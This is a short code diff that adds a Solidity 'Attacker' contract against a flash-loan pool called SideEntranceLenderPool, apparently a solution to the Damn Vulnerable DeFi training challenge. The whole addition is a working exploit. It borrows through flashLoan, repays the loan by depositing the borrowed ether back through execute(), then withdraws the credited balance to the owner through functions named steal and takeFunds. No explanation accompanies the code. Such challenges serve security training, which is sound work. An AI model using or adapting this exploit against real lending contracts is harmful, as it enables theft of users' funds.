@@ -31,3 +31,29 @@ contract SideEntranceLenderPool {
     }
 }
  
+contract Attacker{
+  SideEntranceLenderPool addr;
+  using Address for address payable;
+
+  address public owner;
+  constructor() public{
+    owner = msg.sender;
+  }
+  function execute() external payable{
+    addr.deposit{value: msg.value}();
+  }
+
+  function takeFunds() external{
+    addr.withdraw();
+    payable(owner).transfer(address(this).balance);
+  }
+
+  function steal(SideEntranceLenderPool _addr, uint amount) public{
+    addr = _addr;
+    addr.flashLoan(amount);
+  }
+
+  receive() external payable{
+
+  }
+}
